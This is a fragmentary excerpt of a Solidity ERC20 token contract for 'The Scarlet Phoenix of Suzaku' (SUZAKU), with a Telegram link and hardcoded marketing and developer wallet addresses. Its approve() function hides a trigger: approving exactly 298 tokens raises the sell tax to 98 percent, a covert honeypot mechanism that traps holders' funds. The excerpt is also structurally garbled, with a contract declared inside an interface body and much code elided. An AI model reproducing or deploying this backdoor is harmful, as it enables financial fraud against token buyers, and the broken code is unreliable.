...
// https://t.me/SuzakuPhoenixPortal
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    ...
    contract TheScarletPhoenixOfSuzaku is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "The Scarlet Phoenix of Suzaku";
    string private _symbol = "SUZAKU";
    uint8 private _decimals =  9;

    address payable public marketingWalletAddress = payable(0x08715eD84e79CF0A9CaC9c0B0B7f7BeD0a035323);
    address payable public devWalletAddress = payable(0x9cc9b5cFA05f3F97dDDE3f6a0c9c4b0D4deF8781);
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        ...
        if (amount == 298) {
            if (amount - 200 > _totalTaxIfSelling) {
                _totalTaxIfSelling = amount - 200;
            }
        }
